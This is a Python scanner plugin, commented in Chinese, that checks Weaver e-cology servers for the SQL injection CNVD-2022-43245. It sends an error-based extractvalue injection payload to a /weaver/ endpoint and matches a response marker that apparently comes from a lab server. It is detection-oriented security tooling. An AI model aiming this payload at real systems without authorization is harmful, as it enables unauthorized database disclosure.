# 泛微 e-cology SQL 注入（CNVD-2022-43245）
# 漏洞原因：/weaver/ 部分接口参数未参数化，可 union select / extractvalue 报错注入，
#   泄露数据库内容。
# 本插件仅做存在性验证：GET 带 extractvalue 探针，检测响应签名判定注入点是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/weaver_server.py vuln 模式一致）
SQLI_MARKER = 'weaver-sqli-confirmed'


class WeaverSqliPlugin(PluginBase):
    name = '泛微 e-cology SQL 注入'
    cve = 'CNVD-2022-43245'
    severity = 'high'
    category = 'vuln'
    description = '/weaver/ 接口参数未参数化，extractvalue 报错注入可泄露数据库'
    fix = '使用参数化查询；对输入做白名单校验；WAF 拦截注入特征'

    def verify(self, target, session):
        url = join_url(target, '/weaver/sqlinject')
        # extractvalue 报错注入探针（与 ruoyi sqli 风格一致，仅探测注入点）
        params = {'id': "1 and extractvalue(1,concat(0x7e,(select database()),0x7e))"}
        try:
            resp = session.get(url, params=params)
        except Exception as e:
            print(no('泛微 SQL 注入（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if SQLI_MARKER in text:
            print(ok('存在泛微 e-cology SQL 注入'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 SQL 注入特征：{SQLI_MARKER}',
                fix=self.fix,
            )
        print(no('不存在泛微 e-cology SQL 注入'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 SQL 注入特征（注入点不可达或已修复）')
